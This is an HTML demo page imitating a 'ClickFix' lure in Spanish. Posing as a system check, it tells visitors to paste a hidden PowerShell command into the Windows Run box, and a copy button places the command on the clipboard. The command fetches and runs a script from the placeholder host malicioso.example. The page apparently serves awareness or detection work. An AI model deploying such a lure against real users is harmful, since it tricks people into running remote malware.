<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>ClickFix Demo - Windows Logo Key</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        margin: 24px;
        background: #f8fafc;
        color: #0f172a;
      }
      .card {
        max-width: 720px;
        background: #ffffff;
        border-radius: 16px;
        padding: 20px;
        border: 1px solid #e2e8f0;
        box-shadow: 0 12px 30px rgba(15, 23, 42, 0.12);
      }
      .steps {
        margin-top: 16px;
        display: grid;
        gap: 10px;
      }
      .step {
        background: #f1f5f9;
        padding: 10px 14px;
        border-radius: 12px;
        border: 1px solid #e2e8f0;
      }
      kbd {
        background: #0f172a;
        color: #fff;
        padding: 2px 6px;
        border-radius: 6px;
        font-size: 12px;
      }
      code {
        display: inline-block;
        margin-top: 8px;
        background: #111827;
        color: #f9fafb;
        padding: 6px 10px;
        border-radius: 8px;
      }
      .cta {
        margin-top: 16px;
        padding: 10px 16px;
        background: #dc2626;
        color: #fff;
        border: none;
        border-radius: 10px;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Verificación del sistema</h1>
      <p>
        Para continuar, presiona la <strong>tecla ⊞ (Windows logo key)</strong> + <strong>R</strong> y abre el
        <strong>Run box</strong>. Pega el comando y pulsa <strong>Enter</strong>.
      </p>
      <code>powershell -NoP -W Hidden -Command "iwr http://malicioso.example/update.ps1 | iex"</code>
      <div class="steps">
        <div class="step">Paso 1: ⊞ + R</div>
        <div class="step">Paso 2: Pegar en el Run box</div>
        <div class="step">Paso 3: Enter</div>
      </div>
      <button class="cta" id="copy-winlogo" type="button">Copiar comando</button>
    </div>
    <script>
      const payload =
        'powershell -NoP -W Hidden -Command "iwr http://malicioso.example/update.ps1 | iex"';
      const copyBtn = document.getElementById("copy-winlogo");
      copyBtn.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(payload);
        } catch (error) {
          const fallback = document.createElement("textarea");
          fallback.value = payload;
          document.body.appendChild(fallback);
          fallback.select();
          document.execCommand("copy");
          fallback.remove();
        }
      });
    </script>
  </body>
</html>
